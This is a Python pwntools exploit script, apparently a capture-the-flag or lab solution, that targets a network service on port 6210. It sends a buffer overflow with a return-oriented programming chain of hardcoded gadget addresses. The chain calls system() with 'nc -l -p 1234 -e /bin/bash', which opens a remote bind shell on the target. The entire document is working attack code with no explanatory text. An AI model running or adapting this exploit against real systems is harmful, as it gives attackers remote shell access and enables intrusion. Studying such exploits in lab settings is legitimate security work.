from pwn import *


def send_msg(pc, type, indata, size=None):
    if size is None:
        size = len(indata)

    data = ''
    data += p32(size)
    data += p32(type)
    data += indata

    pc.send(data)


def main():
    system = 0x401A10
    
    add_rsp = 0x409070
    
    pops = 0x4021cc
    mov_rax_r11_pop_pop_pop = 0x40a771
    mov_rdi_rbp_call_rax = 0x421678
    add_ebp_eax = 0x409267
    pop_rax = 0x409073
    push_rax_pop_rbx = 0x44f262
    mov_rax_r13_pop_pop_pop = 0x40c80a
    
    mov_rdi_rbx_call_r12 = 0x4a7f8c

    add_rax_rdx = 0x40e7ed
    sub_rax_rsi = 0x4096cf
    
    pop_rsi = 0x401e89
    pop_rdx = 0x4bb28e
    pop_r12 = 0x402048
    
    cmd = 'nc -l -p 1234 -e /bin/bash' + '\x00'

    # pc = remote('127.0.0.1', 6210)
    pc = remote('172.30.0.2', 6210)

    payload = p64(mov_rax_r13_pop_pop_pop) + p64(0) + p64(0) + p64(0) + \
        p64(pop_rsi) + p64(0x870) + \
        p64(sub_rax_rsi) + \
        p64(push_rax_pop_rbx) + \
        p64(pop_r12) + p64(pop_rax) + \
        p64(mov_rdi_rbx_call_r12) + \
        p64(system)

    send_msg(pc, 109, ('A' * 8) + 4 * p64(pops) + \
        p64(add_rsp) + p64(0x41424344) + \
            payload + cmd + \
            'B' * (0x4b8 - len(payload) - len(cmd)), 0)

    pc.interactive()


if __name__ == '__main__':
    main()